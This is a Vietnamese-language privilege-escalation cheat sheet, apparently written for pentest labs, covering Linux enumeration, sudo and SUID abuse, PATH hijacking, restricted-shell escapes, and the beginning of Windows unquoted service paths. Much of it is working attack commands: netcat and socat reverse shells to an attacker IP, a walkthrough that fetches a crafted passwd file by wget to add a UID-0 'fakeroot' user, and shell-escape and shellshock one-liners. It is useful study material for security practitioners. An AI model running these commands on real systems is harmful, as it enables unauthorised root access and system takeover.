# Shell
**Netcat Shell Stabilisation**

```none
# my machine
nc -nvlp 4444
# Victim's machine
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# my machine
stty raw -echo; fg
```

```none
sudo apt install rlwrap
rlwrap nc -lvnp <port>
stty raw -echo; fg
```


# Linux
## Enumeration
### hostname
Tên máy chủ target

```none
hostname
```
### uname
Thông tin về kernel 

```none
uname -a
```

### /proc/version
Thông tin về kernel sersion và một số thông tin khác như gcc,...
```none
cat /proc/version
``` 

### /etc/issue
Chứa thông tin về hệ thống.

```
cat /etc/issue
```

### ps Command

Xem các tiến trình đang chạy.

```none
# View all running processes
ps -A
# View process tree
ps axjf
# Show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x)
ps aux
```

-   UID: User quản lý tiến trình
-   PID: ID tiến trình
-   PPID: ID tiến trình cha
-   STIME: start time
-   C: CPU đang thực thi
-   Time: Thời gian thực thi của tiến trình
-   CMD: Câu lệnh thực thi

### env
Show các biến môi trường

```none
env
```

### sudo -l
### ls
### id
### /etc/passwd
### history
### ifconfig
### netstat

```none
netstat -ntlp
```
### find Command

-   `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
-   `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
-   `find / -type d -name config`: find the directory named config under “/”
-   `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
-   `find / -perm a=x`: find executable files
-   `find /home -user frank`: find all files for user “frank” under “/home”
-   `find / -mtime 10`: find files that were modified in the last 10 days
-   `find / -atime 10`: find files that were accessed in the last 10 day
-   `find / -cmin -60`: find files changed within the last hour (60 minutes)
-   `find / -amin -60`: find files accesses within the last hour (60 minutes)
-   `find / -size 50M`: find files with a 50 MB size
-   `find / -writable -type d 2>/dev/null` : Find world-writeable folders
-   `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
-   `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
-   `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
-   `find / -name perl*`
-   `find / -name python*`
-   `find / -name gcc*`
-   `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

## Automated Enumeration Tools
-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

## Privilege Escalation: Kernel Exploits

[https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)

## Privilege Escalation: Sudo

https://gtfobins.github.io/

## Privilege Escalation: SUID

[https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)

## Privilege Escalation: Capabilities
Capabilities là những quyền như là kernel user hoặc kernel programs 

```none
getcap -r / 2>/dev/null
```

-   `e` - Effective :This means the capability is “activated”.
    
-   `p` - Permitted : This means the capability can be used/is allowed.
    
-   `i` - Inherited: The capability is kept by child/subprocesses upon execve() for example.

## Privilege Escalation: Cron Jobs

```
cat /etc/crontab
```

## Privilege Escalation: NFS (Network File Sharing)

Nếu có   option  `no_root_squash` thì ta có thể tạo một file thực thi , set quyền SUID và chạy trên máy victim thì ta có thể lấy được quyền root nhưng trong mặc định NFS sẽ là `nfsnobody`

# 1.  Sudoers
Trong Linux/Unix, có 1 file cấu hình cho quyền sudo nằm ở **/etc/sudoers**. Đây là file mà Linux/Unix administrators sử dụng để phân bổ quyền hệ thống cho người dùng trong hệ thống. Điều này cho phép administrators kiểm soát ai có thể làm gì. Khi bạn muốn chạy một lệnh yêu cầu quyền root qua sudo, nhờ vào sudoers file, Linux/Unix sẽ biết bạn có được phép thực thi lệnh đó hay không. 

Có 3 cách để xem, chỉnh sửa file cấu hình quyền:

![](img/20220215145730.png)

![](https://images.viblo.asia/365b4adf-5da7-4945-a993-3826667836fa.png)

Phía trên là Sudoers File mặc định của Ubuntu (cái dấu % kia chỉ ra rằng **admin** và **sudo** là system groups). Hãy cùng xem xét kỹ hơn cấu trúc qua ví dụ dưới đây:

![](https://images.viblo.asia/d188e9dc-42b8-4be8-b4cc-bc1a78e3d09f.PNG)

Ví dụ trên có nghĩa là: User **nghia** có thể thực thi **tất cả lệnh** với **tư cách Root**, **không cần nhập password** khi yêu cầu thực thi, **nhưng** những điều kia chỉ đúng khi thực thi với path (binary) **/usr/bin/find**. Lưu ý:

-   (ALL:ALL) cũng có thể biểu diễn như là (ALL)
-   Nếu (root) nằm ở vị trí của (ALL:ALL) có nghĩa là user có thể thực thi lệnh dưới quyền root.
-   Nếu phần user/group không được định nghĩa, thì khi thực thi sudo sẽ mặc định thực thi với tư cách root user.
-   Phần **Wildcard** thường dùng chỉ định nơi mà lệnh được phép thực thi. Ví dụ mình thêm **/opt/abcxzy** vào cuối ví dụ, điều đó có nghĩa lệnh **find**, thông qua sudo, chỉ được dùng với thư mục **opt/abcxyz/**. 
-   Tham khảo toàn bộ cấu trúc Sudoers tại [đây](https://www.sudo.ws/man/1.8.15/sudoers.man.html)
# 2. Privilege Escalation using Sudo Rights
Dựa vào config của Sudoers file, từ việc chỉ có thể thực thi sudo với những lệnh hạn chế, chúng ta có thể leo thang đặc quyền để có được quyền Root một cách dễ dàng.
## 2.1. Khi đặc quyền root được gán cho Binary commands
Đôi khi người dùng có quyền thực thi bất kỳ tệp hoặc lệnh nào của một thư mục cụ thể như /bin/cp, /bin/cat hoặc /usr/bin/ find.
### 2.1.1 Using Find Command
Như chúng ta đã biết phía trên, user **test** được config trong sudoers file với nội dung:

```none
test ALL=(root) NOPASSWD: /usr/bin/find
```

Câu lệnh sử dụng:

```none
sudo find /(thư mục nào đó) -exec /bin/bash \;
```

hoặc:

```none
sudo find /bin -name nano -exec /bin/sh \;
```
hoặc
```none
sudo find /etc/passwd -exec /bin/sh \;
```
 
### 2.1.2.  Using Perl
Nếu admin để cho chúng ta một số quyền ở bên dưới:
```none
 test ALL= (root) NOPASSWD: /usr/bin/perl, /usr/bin/python, /usr/bin/less, /usr/bin/awk, /usr/bin/man, /usr/bin/vi

```

Câu lệnh:
```none
sudo perl -e 'exec "/bin/bash";'
```
### 2.1.3.  Using Python
Câu lệnh:
```none
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```
### 2.1.4 Using Less Command
Câu lệnh:
```none
sudo less /etc/hosts
```

Gõ **"!bash"** và ấn Enter

![](https://images.viblo.asia/899d588a-d0da-49d6-9957-485d5900ace1.png)

### 2.1.5 Using Man Command
Câu lệnh:

```none
sudo man man
```

Gõ **"!bash"** và ấn Enter giống AWK
### 2.1.5 Using Vim Command
Câu lệnh:

```none
sudo vi
```
Khác với 2 lệnh trên, gõ **":!bash"** và ấn Enter 
### 2.2. Đặc quyền root được gán cho Shell Script
Ví dụ người dùng có thể thực thi 1 script xác định:
```none
test ALL= (root) NOPASSWD: /home/test/root.sh, /home/test/root.py, /home/test/shell
```

- Bash script

```none
echo "/bin/bash -i" >> filename.sh (nếu trong script chưa có sẵn) 
sudo ./filename.sh
```

- Python script

```none
#! /usr/bin/python 
import os 
os.system("/bin/bash")
```

- C script

```none
int main(void)
{
            system("/bin/bash");
}
```

```none 
gcc root.c -o shell 
chmod 777 shell 
sudo ./shell
```

### 2.2. Đặc quyền root được gán cho một số chương trình khác

```none 
test ALL=(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat
```


- Using Env

```none
sudo env /bin/bash
```

-  Using FTP

```none
sudo ftp 
!/bin/bash
```

```none
sudo ftp
!/bin/sh
```

- Using Socat

**Attacker**

```none
socat file:`tty`,raw,echo=0 tcp-listen:8888
```

**Victim**

```none
sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:10.2.32.51:8888  
```


# 3. Using SUID bit - Set owner User ID up on execution

![](img/323dfbd5-3e9b-426f-b4cb-a227a8820921.png)

![](img/da51c46f-1b2c-41e5-9faa-c7605ee94433.png)

SUID ( hay Set user ID ) , thường được sử dụng trên các file thực thi ( executable files ). Quyền này cho phép file được thực thi với các đặc quyền (privileges) của chủ sở hữu file đó.

Nếu một file được sở hữu bởi user **root** và đuợc set SUID bit, thì bất kể ai thực thi file, nó sẽ luôn chạy với các đặc quyền của user **root**. Và khi xem permissions của file, ở phần **User**, nhãn **x** sẽ được chuyển sang nhãn **s**.

Để gán SUID cho 1 file, có 2 cách:

`chmod u+s [tên file]` 

Hoặc

`chmod 4555 [ tên file] ( thêm 4 vào trước permissons )`

Lưu ý: Nếu file chưa có quyền thực thi (executing file as program), **SUID** sẽ là chữ **S**. Để nhãn **S** trở thành **s** bạn phải cấp quyền thực thi cho file.

Tương tự với group

![](img/da51c46f-1b2c-41e5-9faa-c7605ee94433.png)

`chmod g+s [tên file]`

Hoặc

`chmod 2555 [ tên file] ( thêm 2 vào trước permissons )`


#### Sticky Bit

Được dùng cho các thư mục chia sẻ , mục đích là ngăn chặn việc người dùng này xóa file của người dùng kia . Chỉ duy nhất owner và root mới có quyền rename hay xóa các file, thư mục khi nó được set **Sticky Bit**


![](img/7e90692f-060a-4dc4-af29-700ca32f7206.png)

`chmod +t [tên file, thư mục]`

Hoặc

`chmod o+t [tên file, thư mục]`

Hoặc

`chmod 1555 [ tên file,thư mục] ( thêm 1 vào trước permissons )`

## 3.1 Tìm Files có SUID

```none
find / -perm -u=s -type f 2>/dev/null
```

-   **/:** Tìm kiếm bắt đầu từ thư mục gốc (root) của hệ thống, việc này giúp quét toàn bộ files trong tất cả thư mục. Điều này giúp tăng phạm vi tìm kiếm.
-  **-perm:** Tìm kiếm theo các quyền được chỉ định sau đây.
- **-u=s:** Tìm kiếm các file được sở hữu bởi người dùng root. Sử dụng -user \[tên user] để tìm kiếm các files của user đó.
- **-type**: chỉ định loại file tìm kiếm.
- **f**: Chỉ định loại file cần tìm là các **regular file**, mà không là các thư mục hoặc các file đặc biệt. Hầu hết các file được sử dụng trực tiếp bởi người dùng là các regular file. Ví dụ: file thực thi, file văn bản, file hình ảnh... Điều này giúp tăng hiệu quả tìm kiếm.
- **2>:** có nghĩa là redirect (kí hiệu là **>**) **file channel** số **2** tới nơi được chỉ định, **file channel** này ánh xạ tới **stderr (standard error file channel)**, là nơi các chương trình thường ghi lỗi vào.
- **/dev/null:** Đây là nơi được redirect đến, nó là một **pseudo-device** (thiết bị giả) hay một **special character device** mà nó cho phép write (ghi) bất cứ thứ gì lên nó, nhưng khi yêu cầu đọc nó, nó không return bất cứ thứ gì.

Vậy câu lệnh trên sẽ tìm toàn bộ files có SUID của user root. Việc thêm `2>/dev/null` ý nghĩa rằng toàn bộ errors ( **file channel 2** ) trong quá trình chạy sẽ được redirect tới **/dev/null** nhằm bỏ qua tất cả errors đó. 

### SUID được gán cho Copy command


```none
$ id
uid=1001(test) gid=1002(test) groups=1002(test)
$ find / -perm -u=s -type f 2>/dev/null | grep cp
/usr/bin/cp
```

Ý tưởng ở đây là: Chúng ta sẽ copy file **/etc/passwd**. Nơi chứa rất nhiều thông tin nhạy cảm như thông tin của các user trên máy. Sử dụng copy, chúng ta sẽ chuyển nó đến thư mục web **/var/www/html**. Trên máy attacker, chúng ta dễ dàng truy cập, copy toàn bộ nội dung vào 1 file **text**. Tạo một user mới bằng cách sử dụng OpenSSL, gán quyền root cho user đó ( UID = 0 ), lưu vào cuối file **text**. Sau đó chuyển lại về máy victim ở thư mục **/tmp/** (thư mục mặc định, có toàn quyền để tạo hay xóa mọi file) . Cuối cùng là dùng copy để ghi đè lên file **passwd** thật.

Command: `cp /etc/passwd /var/www/html`

![](img/Capture1.PNG)

Copy nội vào file text tên **passwd** và tạo một user mới:

Command: `openssl passwd -1 -salt [salt value] {password}`

```none
hanx@NgoXuanHa$ openssl passwd -1 -salt 123 1
$1$123$fFdLE/c/HAQnsD7rpaQk4.
```

Thêm user vào cuối file text trên, gán UID, GID:

```none
ubuntu@ubuntu1804:/tmp$ echo 'fakeroot:$1$123$fFdLE/c/HAQnsD7rpaQk4.:0:0::/root/root:/bin/bash' >> passwd 

```

```none
ubuntu@ubuntu1804:/tmp$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
```

Tại thư mục **/tmp/** ở máy victim, **wget** file text trên về:

```none
$ cd /tmp
$ wget 192.168.160.129:9999/passwd
--2022-03-29 14:16:09--  http://192.168.160.129:9999/passwd
Connecting to 192.168.160.129:9999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3270 (3.2K) [application/octet-stream]
Saving to: ‘passwd’

passwd                       100%[==============================================>]   3.19K  --.-KB/s    in 0s      

2022-03-29 14:16:09 (20.3 MB/s) - ‘passwd’ saved [3270/3270]

```

```none
cp passwd /etc/passwd
```

Kiểm tra xem đã ghi đè thành công chưa bằng cách đọc 3 dòng cuối của **/etc/passwd**  
Command: `tail -n 3 /etc/passwd`

```none
$ tail -n 3 /etc/passwd
test1:x:1002:1003::/home/test1:/bin/sh
test123:x:1003:1004::/home/test123:/bin/sh
fakeroot:$1$123$fFdLE/c/HAQnsD7rpaQk4.:0:0::/root/root:/bin/bash
$ su fakeroot
Password: 
root@kali:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```


# 4 Using PATH Variables
### Environment Variables

Khi bạn tương tác với hệ thống Linux/Unix trên một Shell session (Ở ubuntu mặc định là **Bash shell**), sẽ có rất nhiều thông tin khác nhau mà shell sử dụng để biết được nó phải làm gì hay cần truy cập tới resources nào trên hệ thống. Khi một shell được mở, một process sẽ được dùng để thu thập và compiles những thông tin cần thiết được dùng cho shell và subshells của shell.

Những thông tin đó có thể lấy từ:

1.  **User input**
    
2.  **Linux Environment settings**, đó là một hệ thống các system-wide files và local files. System-wide files thì ảnh hưởng tới toàn bộ user, còn local files nằm trong thư mục **/home** của user và chỉ ảnh hưởng tới user đó. Với bash user, các system-wide files này bao gồm các file hệ thống:
    
    ```none
    /etc/environment
    /etc/bash.bashrc
    /etc/profile
    ```
    
    và một số files ở local:
    
    ```none
    ~/.bashrc
    ~/.profile -- not read if ~/.bash_profile or ~/.bash_login
    ~/.bash_profile
    ~/.bash_login
    ```
	Cái mà chúng ta quan tâm ở đây đó là **/etc/environment**. Về cơ bản thì các shell process, sử dụng environment như một phương tiện, nó GET hoặc (SET lại) các settings và sau đó lần lượt chuyển chúng cho những child processes của nó.
	
ENV được implement dưới dạng strings ở dạng key-value, nếu có nhiều value thì chúng sẽ được phân cách bằng dấu **:**

```none
KEY=value1:value2:value3...
```

Nếu value có các khoảng trắng (space) lớn thì sử dụng **"** **"**:

```none
KEY="value with spaces"
```

Ở mặc định của Kali:

```none
┌──(root💀kali)-[/bin]
└─# cat /etc/environment
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

Vậy keys ở đây là gì? Đó chính là các variable, nó có thể là environment variable hoặc shell variable.

Với environment variable của hệ thống, các bạn có thể gõ **printenv** ngay trên shell và Enter để hiện thị danh sách, ví dụ một số variable:

```none
┌──(hanx㉿kali)-[/bin]
└─$ cho $SHELL
home/hanx

┌──(hanx㉿kali)-[/bin]
└─$ echo $SHELL                                                
/usr/bin/zsh

┌──(hanx㉿kali)-[/bin]
└─$ echo $USER 
hanx

```

Với shell variable, chúng ta có thể gán nó như một variable thông thường, để sử dụng ta thêm ký tự **$**:

```none
┌──(hanx㉿kali)-[/bin]
└─$ test=nothing    

┌──(hanx㉿kali)-[/bin]
└─$ echo $test
nothing

```

Câu chuyện ở đây đó là **user input** được sử dụng như đã nói ở trên và quan trọng hơn là: Khi log-in hay mở một shell session thì system-wide settings được áp dụng trước, ngay sau đó là local settings và local settings có thể ghi đè (override) system-wide settings. Cũng như **variable được chỉ định sau có thể ghi đè các variable có sẵn trước đó, kể cả các environment variable mặc định của hệ thống**:
 
Ví Dụ:

```none
┌──(hanx㉿kali)-[/bin]
└─$ echo $HOME
/home/hanx
                 
┌──(hanx㉿kali)-[/bin]
└─$ cd 

┌──(hanx㉿kali)-[~]
└─$ pwd           
/home/hanx                                                                
┌──(hanx㉿kali)-[~]
└─$ HOME=test
                                                     
┌──(hanx㉿kali)-[/home/hanx]
└─$ cd
cd: not a directory: test
```


Ví dụ:
### Leo thang C script

```none
┌──(root㉿kali)-[/tmp]
└─$ cat test.c                                                                         
#include<unistd.h>
void main()
{
setuid(0);
setgid(0);
system("id");
}
    
```

`ls gcc test.c -o test`

`chmod u+s test`

```none
ls -la test
-rwsr-xr-x 1 root root 16232 Mar 29 14:53 test
```

```none
┌──(hanx㉿kali)-[/tmp]
└─$ ./test        
uid=1000(hanx) gid=1000(hanx) groups=1000(hanx),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(bluetooth),133(scanner),141(kaboxer)
```

**Leo Thang:** 

Tìm các file có SUID 

```none
┌──(test㉿kali)-[/tmp]
└─$ find / -perm -u=s -type f 2>/dev/null | grep test
/tmp/test
```

Tạo 1 file 

```none
echo "/bin/bash" > id
chmod 777 id
```


```none
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

Thêm đường dẫn `tmp` có chưa file id vào `$PATH` :

```none
$ export PATH=/tmp:$PATH
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

Chạy file test:

```none
$ ./test
root@kali:/tmp# whoami
root

```

### Leo thang Python

```none
┌──(root💀kali)-[/tmp]
└─# cat test_python.py      
import os
os.system("ps")

┌──(root💀kali)-[/tmp]
└─# chmod u+s test_python.py 

┌──(root💀kali)-[/tmp]
└─# ls -la test_python.py   
-rwsr-xr-x 1 root root 26 Mar 29 21:06 test_python.py
```

```
$ python3 test_python.py
    PID TTY          TIME CMD
  14920 pts/5    00:00:00 sh
  16013 pts/5    00:00:00 sh
  16040 pts/5    00:00:00 python3
  16041 pts/5    00:00:00 sh
  16042 pts/5    00:00:00 ps

```

Tìm kiếm SUID

```none
┌──(test㉿kali)-[/tmp]
└─$ find / -perm -u=s -type f 2>/dev/null | grep test_python.py
/tmp/test_python.py
```


Tạo 1 file  ps

```none
echo "/bin/bash" > ps
chmod 777 ps
```


```none
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

Thêm đường dẫn `tmp` có chưa file id vào `$PATH` :

```none
$ export PATH=/tmp:$PATH
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

Chạy file test:

```none
$ python3 test_python.py
root@kali:/tmp# whoami
root
```

#  5. Bypass Restricted Shell
Trong quá trình làm các Labs - các Machine về Linux, các cách leo thang đặc quyền "truyền thống" theo ý nghĩa từ User có đặc quyền thấp lên User có đặc quyền cao hơn chiếm đa số. Nhưng song song với đó có những kỹ thuật leo quyền liên quan tới việc hạn chế khả năng thực thi command của người dùng. Đây là việc có xảy ra có real life khi quản trị viên muốn hạn chế quyền hạn, quyền truy cập, khả năng thực thi đối với một đối tượng người dùng nhất định.

Người dùng có thể truy cập thoải mái, nhưng tất cả những gì họ có thể làm đều nằm trong một ranh giới xác định và bị giới hạn, cực kỳ giới hạn! Đây gọi là **Restricted Shell**.

Nếu bạn đang dùng một OS nào đó thuộc distro Debian, mình tin khả năng cao là bạn đang sử dụng Bash shell. Và **rbash** cũng là loại Restricted Shell được dùng trong đa số trường hợp các labs/machine.

command:

```none
/bin/bash -r 
hoặc 
/bin/bash --restricted
```

Những hạn chế của Restricted Shell : 

1. Không thể dùng **cd** để đổi sang directory khác.
2. Không cho phép sửa system environment variables như SHELL, ENV, PATH.
3. Không thể điều hướng output qua các toán tử redirect như: **>**, **>|**, **<>**, **>&**, **&>** và **>>**.
4. Không thể thực thi binary khi có chỉ định **/** trong đường dẫn. Bạn chỉ có thể sử dụng trực tiếp những binary trong những thư mục được define tại PATH environment variable của shell.
5. Bạn không thể thoát khỏi rbash chỉ đơn giản bằng ấn các lệnh exit, out, quit...đơn giản hay dùng Ctrl+C.
6. Ngoài ra: https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html

##  Bypass Restricted Shell

Những kẽ hở đó có thể kể đến như:

-   Có thể chỉ định **/** để thực thi binary
-   Có thể sử dụng, thực thi các command như: cp, more, man, less, vim, rvim, find,...
-   Thông qua một số ngôn ngữ lập trình mà rbash có thể sử dụng: ruby, php, python...
-   Một số kỹ thuật đặc biệt.

Ví dụ:

![](img/Capture2.PNG)

Sau đó tìm PATH dẫn tới những binary mà User này có thể sử dụng và liệt kê chúng (User có thể dùng **ls**)

![](img/Capture4.PNG)

command:

```none
alfred@break:~$ python -c 'import os; os.system("/bin/sh")'                   //bypass sang sh shell
$ echo $0
/bin/sh                                                                       //confirmed
$ PATH=/usr/local/bin:/usr/bin:/bin:/usr/games                                //define lại PATH variable

$ $ python -c 'import pty; pty.spawn("/bin/bash")'                            //spawn ra một bash shell
alfred@break:~$ echo $0
/bin/bash                                                                     //done
alfred@break:~$ 
```


# 6. SUMARY

- **Enumeration Linux Environment** 

Enumeration is the most important part. We need to enumeration the Linux environmental to check what we can do to bypass the rbash. We need to enumerate : 
1) First we must to check for available commands like cd/ls/echo etc. 
2) We must to check for operators like >,>>,<,|. 
3) We need to check for available programming languages like perl,ruby,python etc. 
4) Which commands we can run as root (sudo -l). 
5) Check for files or commands with SUID perm. 
6) You must to check in what shell you are : echo $SHELL you will be in rbash by 90% 
7) Check for the Environmental Variables : run env or printenv Now let’s move into Common Exploitation Techniques

- **Common Exploitation Techniques**

1) If "/" is allowed you can run /bin/sh or /bin/bash. 
2) If you can run cp command you can copy the /bin/sh or /bin/bash into your directory. 
3)  From ftp > !/bin/sh or !/bin/bash 
4)  From gdb > !/bin/sh or !/bin/bash 
5)  From more/man/less > !/bin/sh or !/bin/bash
6)  From vim > !/bin/sh or !/bin/bash 
7)  From rvim > :python import os; os.system("/bin/bash ) 
8)  From scp > scp -S /path/yourscript x y: 
9)  From awk > awk 'BEGIN {system("/bin/sh or /bin/bash")}' 
10)  From find > find / -name test -exec /bin/sh or /bin/bash \;

- **Programming Languages Techniques**

1) From except > except spawn sh then sh. 
2) From python > python -c 'import os; os.system("/bin/sh")' 
3) From php > php -a then exec("sh -i"); 
4) From perl > perl -e 'exec "/bin/sh";' 
5) From lua > os.execute('/bin/sh'). 
6) From ruby > exec "/bin/sh" 

- **Advanced Techniques**

1) From ssh > ssh username@IP - t "/bin/sh" or "/bin/bash" 
2) From ssh2 > ssh username@IP -t "bash --noprofile" 
3) From ssh3 > ssh username@IP -t "() { :; }; /bin/bash" (shellshock) 4) From ssh4 > ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID) 
5) From git > git help status > you can run it then !/bin/bash 
6) From pico > pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T 
7) From zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash" 
8) From tar > tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash

## Lab Note

- Nếu user có quyền sử dụng shell của user khác:

![](img/Capture5.PNG)

- Ta có thể sử dụng command : `sudo -i -u scriptmanager` hoặc `sudo -u [user] /bin/bash`
	-    **_-i_**: run login shell as the target user
	-    **_-u_**: run command (or edit file) as specified user name or ID

# Windows
# 1. Information Gathering
- `whoami `will display the username the shell is running as.
- `net user` : command to gather more information.

```none
C:\Users\HaNX>net user hanx
User name                    HaNX
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/24/2022 4:08:12 PM
Password expires             Never
Password changeable          3/24/2022 4:08:12 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/14/2022 3:42:39 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

```none
C:\Users\HaNX>hostname
h4nx0x
```

```none
C:\Users\HaNX>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19044 N/A Build 19044
System Type:               x64-based PC
```

Liệt kê các tiến tính và services đang chạy:

```none
C:\Users\HaNX>tasklist /SVC
```

```none
C:\Users\HaNX>netsh advfirewall show currentprofile

Public Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Enable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.

```


## Service Exploits
### Unquoted Service Path
Khi các dịch vụ được tạo mà có đường dẫn thực thi chứa space và không được đặt trong dấu ngoặc kép (đường dẫn tuyệt đối) thì có thể dẫn dến lỗ hổng Unquoted Service Path. Lỗ hổng này cho phép người dùng nhận được các quyền hạn của SYSTEM (chỉ khi vulnerable service đang được cấp quyền SYSTEM ở thời điểm đó). Lỗ hổng này gần giống với lỗ hổng PATH Variable trên Linux.

Trong Windows, nếu dịch vụ không đặt trong ngoặc kép và có khoảng trắng (space), nó sẽ xử lý khoảng trắng (space) dưới dạng ngắt dòng lệnh và lấy tất cả các phần còn lại làm đối số.

